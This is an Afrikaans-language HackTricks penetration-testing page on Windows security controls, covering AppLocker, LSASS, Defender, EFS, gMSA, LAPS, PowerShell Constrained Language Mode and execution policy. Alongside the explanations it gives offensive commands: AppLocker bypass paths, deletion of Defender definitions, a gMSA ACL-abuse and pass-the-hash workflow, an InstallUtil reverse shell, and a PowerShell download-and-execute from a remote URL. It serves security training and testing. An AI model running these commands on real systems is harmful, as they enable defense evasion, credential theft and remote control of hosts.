# Windows-sekuriteitskontroles

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassingswitlys is 'n lys goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat op 'n stelsel teenwoordig mag wees en uitgevoer mag word. Die doel is om die omgewing te beskerm teen skadelike malware en sagteware wat nie goedgekeur is nie en nie aan die spesifieke besigheidsbehoeftes van 'n organisasie voldoen nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **toepassingswitlysoplossing** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fyn beheer** oor uitvoerbare lêers, skrifte, Windows-installeerderlêers, DLL's, verpakte toepassings en installeerders vir verpakte toepassings.\
Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe blokkeer** en skryftoegang tot sekere gidse beperk, **maar dit alles kan omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied ’n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **skryfbare vouers** om AppLocker-beleid te omseil: As AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **skryfbare vouers** wat jy kan gebruik om dit te **omseil**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Algemeen **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swak geskrewe reëls kan ook omseil word**
  - Jy kan byvoorbeeld **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** omseil deur enige plek ’n **vouer genaamd `allowed`** te skep; dit sal toegelaat word.
  - Organisasies fokus ook dikwels daarop om die uitvoerbare lêer **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** te **blokkeer**, maar vergeet van die **ander** [**PowerShell-uitvoerbare lêerliggings**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL-afdwinging word baie selde geaktiveer** weens die bykomende las wat dit op ’n stelsel kan plaas, en die hoeveelheid toetsing wat nodig is om te verseker dat niks breek nie. Om **DLL's as backdoors te gebruik, sal dus help om AppLocker te omseil**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Berging van aanmeldbewyse

### Security Accounts Manager (SAM)

Plaaslike aanmeldbewyse is in hierdie lêer teenwoordig; die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **aanmeldbewyse** (gehash) word om redes van Single Sign-On in die **geheue** van hierdie substelsel **gestoor**.\
**LSA** bestuur die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikertoestemmings...), **verifikasie**, **toegangstokens**...\
LSA is die een wat die verskafde aanmeldbewyse in die **SAM**-lêer **nagaan** (vir ’n plaaslike aanmelding) en met die **domeinbeheerder kommunikeer** om ’n domeingebruiker te verifieer.

Die **aanmeldbewyse** word binne die **LSASS-proses** **gestoor**: Kerberos-kaartjies, NT- en LM-hashes, maklik ontsleutelde wagwoorde.

### LSA-geheime

LSA kan sekere aanmeldbewyse op skyf stoor:

- Wagwoord van die Active Directory-rekenaarrekening (domeinbeheerder onbereikbaar).
- Wagwoorde van Windows-diensrekeninge
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Active Directory. Dit is slegs op domeinbeheerders teenwoordig.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n Antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows Server. Dit **blokkeer** algemene pentesting-nutsgoed soos **`WinPEAS`**. Daar is egter maniere om **hierdie beskerming te omseil**.

### Kontroleer

Om die **status** van **Defender** na te gaan, kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kontroleer die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te lys, kan jy ook die volgende uitvoer:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Geënkripteerde lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie te gebruik, met ’n **simmetriese sleutel** wat as die **File Encryption Key (FEK)** bekend staan. Hierdie sleutel word met die gebruiker se **publieke sleutel** geënkripteer en in die geënkripteerde lêer se $EFS **alternatiewe datastroom** gestoor. Wanneer dekripsie nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te dekripteer. Meer besonderhede is [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) beskikbaar.

**Dekripsiescenario's sonder gebruikerinisiasie** sluit die volgende in:

- Wanneer lêers of vouers na ’n lêerstelsel sonder EFS, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), verskuif word, word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat via die SMB/CIFS-protokol oor die netwerk gestuur word, word voor versending gedekripteer.

Hierdie enkripsiemetode bied die eienaar **deursigtige toegang** tot geënkripteerde lêers. Die eienaar se wagwoord bloot verander en aanmeld sal egter nie dekripsie moontlik maak nie.

**Belangrike punte**:

- EFS gebruik ’n simmetriese FEK, wat met die gebruiker se publieke sleutel geënkripteer word.
- Dekripsie gebruik die gebruiker se private sleutel om toegang tot die FEK te verkry.
- Outomatiese dekripsie vind onder spesifieke omstandighede plaas, soos wanneer lêers na FAT32 gekopieer word of oor die netwerk gestuur word.
- Die eienaar kan sonder bykomende stappe toegang tot geënkripteerde lêers verkry.

### Gaan EFS-inligting na

Gaan na of ’n **gebruiker** hierdie **diens** **gebruik het** deur te kyk of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Gaan na **wie** **toegang** tot die lêer het deur cipher /c \<file>\ te gebruik\
Jy kan ook `cipher /e` en `cipher /d` binne ’n vouer gebruik om al die lêers te **enkripteer** en te **dekripteer**

### Dekripteer EFS-lêers

#### As Authority System

Hierdie metode vereis dat die **slagoffergebruiker** ’n **proses** op die gasheer **laat loop**. Indien dit die geval is, kan jy ’n `meterpreter`-sessie gebruik om die token van die gebruiker se proses na te boots (`impersonate_token` van `incognito`). Of jy kan eenvoudig na die gebruiker se proses `migrate`.

#### As jy die gebruiker se wagwoord ken

Mimikatz dokumenteer hoe om die gebruiker se sertifikaat-/private-sleutelmateriaal in te voer en EFS-beskermde lêers te dekripteer wanneer die wagwoord bekend is.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge waarvoor die instelling "**Password never expire**" dikwels geaktiveer is, bied gMSA’s ’n veiliger en makliker bestuurbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSA’s gebruik ’n ingewikkelde wagwoord van 240 karakters wat outomaties verander volgens die domein- of rekenaarbeleid. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde sekuriteit**: Hierdie rekeninge is immuun teen uitsluiting en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
- **Ondersteuning vir verskeie gashere**: gMSA’s kan oor verskeie gashere gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
- **Ondersteuning vir geskeduleerde take**: Anders as bestuurde diensrekeninge, ondersteun gMSA’s die uitvoer van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties op wanneer die rekenaar se sAMaccount-besonderhede of DNS-naam verander, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA’s word in die LDAP-eienskap _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) teruggestel. Hierdie wagwoord, ’n geënkripteerde databrokkie bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA’s geïnstalleer is, verkry word, wat ’n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, word ’n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geverifieer word.

![Relay NTLM-verifikasie om ’n gMSA-wagwoord te verkry](../../images/asd1.png)<sup>[[1]](#references)</sup>

Jy kan hierdie wagwoord lees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Vind meer inligting in die geargiveerde oorspronklike navorsing**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Dieselfde navorsing verduidelik hoe ’n **NTLM relay attack** ’n **gMSA-wagwoord** kan bekom wanneer die relayed principal gemagtig is om `msDS-ManagedPassword` te lees.<sup>[[1]](#references)</sup>

### Misbruik van ACL chaining om gMSA-managed-wagwoord te lees (GenericAll -> ReadGMSAPassword)

In baie omgewings kan gebruikers met lae voorregte na gMSA-geheime pivot sonder om ’n DC te kompromitteer deur verkeerd gekonfigureerde objek-ACL’s te misbruik:<sup>[[3]](#references)</sup>

- ’n Groep wat jy kan beheer (bv. via GenericAll/GenericWrite) kry `ReadGMSAPassword`-toegang tot ’n gMSA.
- Deur jouself by daardie groep te voeg, erf jy die reg om die gMSA se `msDS-ManagedPassword`-blob oor LDAP te lees en bruikbare NTLM-eiebewyse af te lei.

Tipiese workflow:

1) Ontdek die pad met BloodHound en merk jou foothold-principals as Owned. Soek na edges soos:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Voeg jouself by die tussengroep wat jy beheer (voorbeeld met bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Lees die gMSA-bestuurde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die onttrekking van `msDS-ManagedPassword` en omskakeling na NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Meld aan as die gMSA met die NTLM-hash (geen plaintext nodig nie). As die rekening in Remote Management Users is, sal WinRM direk werk:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Aantekeninge:
- LDAP-lesings van `msDS-ManagedPassword` vereis sealing (bv. LDAPS/sign+seal). Gereedskap hanteer dit outomaties.
- Aan gMSAs word dikwels plaaslike regte soos WinRM toegeken; valideer groeplidmaatskap (bv. Remote Management Users) om laterale beweging te beplan.
- As jy net die blob nodig het om self die NTLM te bereken, sien MSDS-MANAGEDPASSWORD_BLOB-structuur.

Nog ’n ACL-pad is ’n skryftoestemming op die gMSA-objek self. `msDS-GroupMSAMembership` is die sekuriteitsbeskrywer wat bepaal watter principals die bestuurde wagwoord mag ophaal. Die GUID van die skema is `888eedd6-ce04-df40-b462-b8a50e41ba38`. ’n Presiese `WriteProperty` ACE op daardie attribuut vir ’n groep waaroor jy beheer het, kan ’n moontlike manier wees om die lys van lesers te verander; dit verskil daarvan om reeds as ’n leser gelys te wees. Bevestig die volledige DACL, deny- en geërfde ACEs, en effektiewe toestemmings voordat jy die pad as bruikbaar beskou. ’n Nuwe groeplidmaatskap vereis ook ’n verfriste token/sessie voordat jy ’n wagwoord probeer lees.<sup>[[7]](#references)</sup>



## LAPS

Die **Local Administrator Password Solution (LAPS)**, beskikbaar om af te laai by [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **gerandomiseer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs tot gemagtigde gebruikers beperk. Met voldoende toestemmings kan plaaslike admin-wagwoorde gelees word.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **beperk baie van die funksies** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-objekte, die toelating van slegs goedgekeurde .NET-tipes, XAML-gebaseerde werkvloeie, PowerShell-klasse en meer.

### **Kontroleer**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Op huidige Windows-weergawes werk daardie bypass nie meer nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compile, moet jy dalk** **'n** _**Verwysing byvoeg**_ -> _Browse_ ->_Browse_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die beperkte modus te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).<sup>[[4]](#references)</sup>

## PS-uitvoeringsbeleid

By verstek is dit op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> gevind word

## Security Support Provider Interface (SSPI)

Is die API wat gebruik kan word om gebruikers te verifieer.

SSPI kies ’n geskikte verifikasieprotokol vir twee masjiene wat kommunikeer, en verkies Kerberos wanneer dit beskikbaar is. Hierdie protokolle word geïmplementeer deur Security Support Providers (SSPs), wat as DLL’s op Windows geïnstalleer word; albei eweknieë moet die onderhandelde provider ondersteun.

### Main SSPs

- **Kerberos**: Die voorkeurprotokol
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Om versoenbaarheidsredes
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webbedieners en LDAP, wagwoord in die vorm van ’n MD5-hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Word gebruik om te onderhandel oor watter protokol gebruik moet word (Kerberos of NTLM; Kerberos is die verstekprotokol)
  - %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of net een aanbied.

## UAC - User Account Control

[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n funksie wat ’n **toestemmingsversoek vir verhoogde aktiwiteite** moontlik maak.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via regteketting na WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Om AppLocker en PowerShell Constrained Language Mode te Bypass](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 maniere om die PowerShell Execution Policy te Bypass](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ dekripteer EFS-lêers](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ms-DS-GroupMSAMembership-kenmerk](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
